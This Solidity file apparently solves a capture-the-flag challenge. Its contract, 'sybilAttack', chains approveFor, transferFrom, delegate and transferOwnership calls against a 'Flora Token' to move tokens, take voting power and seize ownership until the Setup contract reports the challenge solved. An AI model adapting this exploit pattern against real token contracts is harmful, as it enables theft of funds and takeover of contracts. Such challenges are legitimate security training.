// SPDX-License-Identifier: NONLICENSED
pragma solidity 0.8.0;
// Flora Token functions to use  
interface IFloraToken {
    function delegate(address delegatee) external;
    function transferFrom(address from, address to, uint256 amount) external returns (bool);
    function transferOwnership(address newOwner) external; 
}
// Setup function to use  
interface ISetup {
    function isSolved() external view returns (bool);
    function approveFor(address TokenHolder, address spender, uint256 amount) external returns(bool);
}

contract sybilAttack {
    IFloraToken public challenge;
    ISetup public setup;
    address challenger; 
    address attack;

    // input Flora Token address 
    constructor (address challengeAddress, address setupAddress) payable {
        challenge = IFloraToken(challengeAddress);
        setup = ISetup(setupAddress);
        challenger = msg.sender;
    }

    function delegate(address delegatee) public {
        challenge.delegate(delegatee);
    }      

    function transferFrom(address from, address to, uint256 amount) public returns (bool) {
        challenge.transferFrom(from, to, amount);
        return(true);
    }  
    
    function transferOwnership(address newOwner) public {
        challenge.transferOwnership(newOwner);
    }  

    function isSolved() public view returns (bool) {
        return(setup.isSolved());
    }

    function setAttack() public returns(address){
        attack = address(this);
        return(attack);
    }
    function approveFor(address TokenHolder, address spender, uint256 amount) public returns(bool) {
        setup.approveFor(TokenHolder, spender, amount);
        return(true);
    }
    
    /// @notice Can be used to finalize the exploit patten
    function finalize() external payable {
        setAttack();
        approveFor(challenger, attack, 100);
        transferFrom(challenger, attack, 100);
        delegate(challenger);
        transferOwnership(challenger);
        isSolved();
    }    
}
